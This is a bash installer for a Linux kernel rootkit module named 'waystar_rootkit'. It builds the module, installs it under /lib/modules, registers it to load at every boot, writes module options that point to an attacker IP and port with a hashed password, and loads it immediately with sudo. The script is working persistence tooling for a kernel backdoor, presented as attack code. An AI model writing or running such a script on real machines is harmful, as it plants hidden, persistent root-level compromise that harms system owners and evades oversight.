#!/bin/bash
#
set -e

MODULE_NAME="waystar_rootkit"
SRC_DIR="$(dirname "$0")"
MODULE_FILE="$SRC_DIR/${MODULE_NAME}.ko"
INSTALL_DIR="/lib/modules/$(uname -r)/extra"
MODPROBE_CONF="/etc/modprobe.d/${MODULE_NAME}.conf"
MODULES_LOAD="/etc/modules-load.d/${MODULE_NAME}.conf"
ATTACKER_IP="192.168.1.30"
ATTACKER_PORT="5555"
HASHED_PASSWORD="dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676"

echo "[*] Building kernel module..."
make -C "$SRC_DIR"

if [ ! -f "$MODULE_FILE" ]; then
    echo "[-] Build failed or $MODULE_FILE not found."
    exit 1
fi

echo "[*] Installing $MODULE_NAME to $INSTALL_DIR"
sudo mkdir -p "$INSTALL_DIR"
sudo cp "$MODULE_FILE" "$INSTALL_DIR/"
sudo depmod

echo "[*] Configuring automatic loading at boot"
echo "$MODULE_NAME" | sudo tee "$MODULES_LOAD" > /dev/null

echo "[*] Setting module parameters"
echo "options $MODULE_NAME attacker_ip=$ATTACKER_IP attacker_port=$ATTACKER_PORT" password=$HASHED_PASSWORD \
    | sudo tee "$MODPROBE_CONF" > /dev/null

echo "[*] Loading module now"
sudo modprobe "$MODULE_NAME"

echo "[+] Done. Reboot to verify persistence."
